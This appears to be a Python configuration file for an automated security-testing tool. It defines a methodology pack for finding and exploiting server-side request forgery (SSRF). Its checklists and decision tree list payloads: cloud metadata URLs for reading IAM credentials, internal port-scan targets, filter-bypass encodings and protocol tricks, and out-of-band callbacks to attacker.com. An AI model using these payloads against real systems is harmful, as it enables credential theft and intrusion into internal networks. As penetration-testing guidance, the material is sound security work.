"""Server-Side Request Forgery (SSRF) Methodology Pack."""

from deephunter.core.types import BugClass
from deephunter.methodology.packs.base import (
    DecisionTreeBranch,
    DecisionTreeNode,
    MethodologyPack,
    PackCategory,
    PackChecklist,
    PackPlannerRule,
)

PACK = MethodologyPack(
    name="SSRF",
    version="1.0.0",
    category=PackCategory.CROSS_CUTTING,
    description="Expert methodology for identifying and exploiting SSRF vulnerabilities. Covers cloud metadata service access, internal port scanning, data exfiltration, blind SSRF with OOB techniques, and cloud service authentication bypass via SSRF.",
    supported_technologies=["Any framework fetching user-controlled URLs", "AWS", "GCP", "Azure", "Kubernetes"],
    attack_surface_areas=["ssrf", "metadata", "cloud", "internal-network", "port-scan", "data-exfiltration"],
    investigation_priority=95,
    related_packs=["Command Injection", "Injection", "File Upload", "Cloud Security"],

    checklists=[
        PackChecklist(
            objective="Identify SSRF entry points",
            description="Find all locations where user input controls URL fetching.",
            procedure="1. Search for: file_get_contents, curl, wget, fetch, requests, httpx, urllib, axios, open(), urllib2 in source\n2. Look for URL parameters: url, uri, src, dest, redirect, path, continue, url, window, to, out, view, dir, show, md, raw, q, feed, user, data, html\n3. Check for URL loading in file download/upload features\n4. Look for webhook and callback features\n5. Check URL preview/thumbnail generation features\n6. Check PDF/image generation that fetches external URLs\n7. Review OpenAPI/API spec imports for URL parameters\n8. Check for SSO/OAuth token exchange that fetches user-provided URLs",
            priority="critical",
            difficulty="easy",
            required_evidence=["List of potential SSRF entry points with URL parameters"],
            expected_result="All SSRF entry points identified",
            bug_classes=[BugClass.SSRF, BugClass.INFO_DISCLOSURE],
            tags=["ssrf", "identification", "recon"],
        ),
        PackChecklist(
            objective="Test SSRF against cloud metadata services",
            description="Probe for access to cloud provider metadata endpoints.",
            procedure="1. AWS EC2: http://169.254.169.254/latest/meta-data/ and /latest/user-data/\n2. AWS EC2 IMDSv2: requires PUT request first to get token\n3. GCP: http://metadata.google.internal/computeMetadata/v1/ and /instance/ \n4. Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01\n5. DigitalOcean: http://169.254.169.254/metadata/v1/\n6. Alibaba Cloud: http://100.100.100.200/latest/meta-data/\n7. Try both GET and PUT requests; try IMDSv2 token: PUT /latest/api/token HTTP/1.1",
            priority="critical",
            difficulty="easy",
            required_evidence=["Metadata from cloud service returned (instance ID, user data, IAM credentials)"],
            expected_result="Cloud metadata service access confirmed",
            bug_classes=[BugClass.SSRF, BugClass.INFO_DISCLOSURE, BugClass.CRYPTO_FAILURE],
            tags=["ssrf", "cloud", "metadata", "aws", "gcp", "azure"],
        ),
        PackChecklist(
            objective="Test SSRF for internal port scanning",
            description="Use SSRF to scan internal network ports and services.",
            procedure="1. Scan localhost ports: http://localhost:22, 80, 443, 8080, 3306, 27017, 6379\n2. Scan internal IP ranges: http://10.0.0.1-254, 172.16.0.1-254, 192.168.0.1-254\n3. Use timing differences to detect open ports (connection timeout vs immediate)\n4. Try common internal services: Redis (6379), MongoDB (27017), MySQL (3306), PostgreSQL (5432),memcached (11211)\n5. Check response codes and banners for service identification\n6. Tools: generate port list, iterate through Burp Suite Intruder or Turbo Intruder",
            priority="high",
            difficulty="medium",
            required_evidence=["Internal ports/services identified via SSRF response"],
            expected_result="Internal network enumeration achieved via SSRF",
            bug_classes=[BugClass.SSRF, BugClass.INFO_DISCLOSURE],
            tags=["ssrf", "port-scan", "internal", "recon"],
        ),
        PackChecklist(
            objective="Test blind SSRF with OOB techniques",
            description="Detect blind SSRF that returns no data to attacker.",
            procedure="1. DNS OOB: inject URL like http://attacker.com/UNIQUEID in SSRF parameter\n2. HTTP OOB: make server request your URL with path containing data\n3. CloudWatch Events: http://.attacker.com (AWS specific)\n4. Blind XSS: embed XSS payload in URL that server fetches\n5. SMTP/email: make server send email via mail() or SMTP to attacker\n6. Test with Interactsh, Burp Collaborator, or dnslog.cn\n7. Check if timeouts differ for reachable vs unreachable hosts",
            priority="high",
            difficulty="medium",
            required_evidence=["OOB interaction confirmed: DNS lookup, HTTP request, or email sent"],
            expected_result="Blind SSRF confirmed via OOB detection",
            bug_classes=[BugClass.SSRF, BugClass.INFO_DISCLOSURE],
            tags=["ssrf", "blind", "oob", "dns-exfiltration"],
        ),
        PackChecklist(
            objective="Test SSRF filter bypasses",
            description="Bypass common SSRF protections including allowlists, blocklists, and URL parsing.",
            procedure="1. IP encoding: 127.1, 2130706433, 0x7f000001, ::1, localhost\n2. URL parsing bypass: http://google.com@127.0.0.1, http://127.0.0.1#@google.com\n3. Redirect: control a redirect from an allowed domain to internal service\n4. Open redirect Chaining: http://allowed.com/redirect?url=http://169.254.169.254\n5. DNS rebinding: use fast-changing DNS to point to internal IP after validation\n6. Blacklist bypass: 127.0.0.1 vs 127.1, localhost vs 127.0.0.1\n7. Protocol switching: data://, file://, dict://, sftp://, ldap://, gopher://\n8. SSRF via Referer header on 3rd party integrations",
            priority="high",
            difficulty="hard",
            required_evidence=["SSRF filter bypass achieved"],
            expected_result="SSRF works despite filters",
            bug_classes=[BugClass.SSRF, BugClass.INFO_DISCLOSURE],
            tags=["ssrf", "filter-bypass", "encoding", "redirection"],
        ),
        PackChecklist(
            objective="Test SSRF for access to internal services",
            description="Access internal admin panels, APIs, and services via SSRF.",
            procedure="1. Admin panels: http://localhost:80/admin, http://127.0.0.1:8080/manage\n2. Internal APIs: http://10.0.0.1:8080/api/internal, http://169.254.169.254/latest/meta-data/iam/security-credentials/\n3. Database consoles: http://localhost:3306, http://localhost:5432\n4. Redis: http://localhost:6379 (might leak with CONFIG GET)\n5. Kibana/Elasticsearch: http://localhost:5601, http://localhost:9200\n6. Kubernetes API: https://kubernetes.default.svc\n7. Cloud console: http://169.254.169.254/latest/meta-data/identity-ksm/\n8. Try to read cloud credentials from IMDS for privilege escalation",
            priority="critical",
            difficulty="medium",
            required_evidence=["Internal service accessed or data exfiltrated via SSRF"],
            expected_result="Internal service access via SSRF confirmed",
            bug_classes=[BugClass.SSRF, BugClass.INFO_DISCLOSURE, BugClass.PRIVILEGE_ESCALATION],
            tags=["ssrf", "internal", "cloud", "data-exfiltration"],
        ),
    ],

    decision_trees=[
        DecisionTreeNode(
            id="ssrf-root",
            question="What SSRF response do you get?",
            branches=[
                DecisionTreeBranch(
                    condition="Full response visible",
                    conclusion="TEST: 1. Access cloud metadata 2. Port scan internal network 3. Read internal files/services 4. Escalate with cloud credentials",
                ),
                DecisionTreeBranch(
                    condition="No response (blind)",
                    conclusion="TEST: 1. DNS OOB: http://attacker.com/uniqueid 2. HTTP OOB via Interactsh 3. Test time-based detection 4. Try blind XSS in URL",
                ),
                DecisionTreeBranch(
                    condition="Filtered/blocked",
                    conclusion="TEST: 1. IP encoding (127.1, hex, int) 2. URL redirect chaining 3. DNS rebinding 4. Protocol variants (data://, file://) 5. localhost alternative names",
                ),
                DecisionTreeBranch(
                    condition="Only localhost accessible",
                    conclusion="TEST: 1. Access local services (Redis, MongoDB) 2. Read local files via file:// 3. Try port scanning on localhost 4. Access local admin panels",
                ),
            ],
        ),
    ],

    planner_rules=[
        PackPlannerRule(attack_surface="ssrf", description="Prioritize SSRF testing on all URL-fetching features", priority_modifier=0.30, phase="reconnaissance"),
        PackPlannerRule(attack_surface="ssrf", description="Always test cloud metadata service (169.254.169.254) when SSRF found", priority_modifier=0.25, phase="exploitation"),
        PackPlannerRule(attack_surface="ssrf", description="Test blind SSRF with DNS OOB techniques when response not visible", priority_modifier=0.20, phase="exploitation"),
    ],

    references=[
        {"source": "OWASP", "id": "SSRF", "title": "SSRF", "url": "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"},
        {"source": "PortSwigger", "id": "SSRF2", "title": "SSRF", "url": "https://portswigger.net/web-security/ssrf"},
        {"source": "AWS", "id": "IMDS", "title": "EC2 IMDS", "url": "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html"},
        {"source": "BugBounty", "id": "SSRFH", "title": "SSRF Handbook", "url": "https://www.bugbountyhunting.com/ssrf/"},
    ],
    tags=["ssrf", "cloud", "metadata", "internal", "rce"],
)